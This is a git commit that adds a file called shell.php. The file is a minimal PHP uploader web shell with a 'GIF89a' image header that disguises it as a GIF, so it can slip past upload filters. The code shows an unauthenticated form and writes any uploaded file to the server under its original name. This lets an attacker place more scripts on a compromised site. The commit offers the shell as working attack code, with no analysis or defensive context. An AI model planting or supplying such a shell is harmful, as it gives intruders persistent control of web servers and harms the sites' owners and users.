f24398bc978a2fff8c6e760332d9735fb7e6bb68
bintang4 <43073401+bintang4@users.noreply.github.com>
2022-11-22 13:42:33 +0700

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,9 @@
+GIF89a;
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>File Uploaded!!<b><br><br>'; }
+else { echo '<b>Fail To Upload File!!!</b><br><br>'; }
+}
+?>
